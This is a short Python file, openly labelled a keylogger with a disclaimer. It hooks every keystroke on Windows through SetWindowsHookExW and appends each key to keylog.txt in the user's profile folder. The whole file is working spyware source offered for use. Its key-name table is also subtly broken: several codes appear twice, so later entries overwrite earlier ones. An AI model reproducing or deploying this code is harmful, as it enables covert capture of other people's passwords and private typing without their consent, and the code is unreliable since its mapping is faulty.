#THIS IS A KEYLOGGER
#WHAT YOU DO WITH THIS CODE IS YOUR RESPONSIBILITY
import ctypes
import time
import os

user32 = ctypes.WinDLL('user32', use_last_error=True)

class MSG(ctypes.Structure):
    _fields_ = [
        ("hwnd", ctypes.c_void_p),
        ("message", ctypes.c_uint),
        ("wParam", ctypes.c_void_p),
        ("lParam", ctypes.c_void_p),
        ("time", ctypes.c_uint),
        ("pt", ctypes.POINTER(ctypes.c_int)),
    ]

CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))

def on_key_event(nCode, wParam, lParam):
    if wParam == 256:  # 256 is the code for a key down event
        lParam_ptr = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int))
        key_code = lParam_ptr.contents.value
        key_name = get_key_name(key_code)
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']))
        keylog_path = os.path.join(desktop_path, 'keylog.txt')
        with open(keylog_path, "a") as logfile:
            logfile.write(f"Key:{key_name}\n")
    return user32.CallNextHookEx(hook, nCode, wParam, lParam)

def get_key_name(key_code):
    key_names = {
    48: "0",
    49: "1",
    50: "2",
    51: "3",
    52: "4",
    53: "5",
    54: "6",
    55: "7",
    56: "8",
    57: "9",
    65: "a",
    66: "b",
    67: "c",
    68: "d",
    69: "e",
    70: "f",
    71: "g",
    72: "h",
    73: "i",
    74: "j",
    75: "k",
    76: "l",
    77: "m",
    78: "n",
    79: "o",
    80: "p",
    81: "q",
    82: "r",
    83: "s",
    84: "t",
    85: "u",
    86: "v",
    87: "w",
    88: "x",
    89: "y",
    90: "z",
    91: "win",
    92: "win",
    93: "menu",
    96: "numpad0",
    97: "numpad1",
    98: "numpad2",
    99: "numpad3",
    100: "numpad4",
    101: "numpad5",
    102: "numpad6",
    103: "numpad7",
    104: "numpad8",
    105: "numpad9",
    106: "numpad*",
    107: "numpad+",
    108: "numpad,",
    109: "numpad-",
    110: "numpad.",
    111: "numpad/",
    112: "f1",
    113: "f2",
    114: "f3",
    115: "f4",
    116: "f5",
    117: "f6",
    118: "f7",
    119: "f8",
    120: "f9",
    121: "f10",
    122: "f11",
    123: "f12",
    33: "!",
    34: "\"",
    35: "#",
    36: "$",
    37: "%",
    38: "&",
    39: "'",
    40: "(",
    41: ")",
    42: "*",
    43: "+",
    44: ",",
    45: "-",
    46: ".",
    47: "/",
    58: ":",
    59: ";",
    60: "<",
    61: "=",
    62: ">",
    63: "?",
    64: "@",
    91: "[",
    92: "\\",
    93: "]",
    94: "^",
    95: "_",
    96: "`",
    123: "{",
    124: "|",
    125: "}",
    126: "~",
}
    return key_names.get(key_code, "unknown")

on_key_event_func = CMPFUNC(on_key_event)

hook = user32.SetWindowsHookExW(13, on_key_event_func, 0, 0) 

while True:
    time.sleep(1)
    msg = MSG()
    user32.GetMessageW(ctypes.byref(msg), 0, 0, 0)

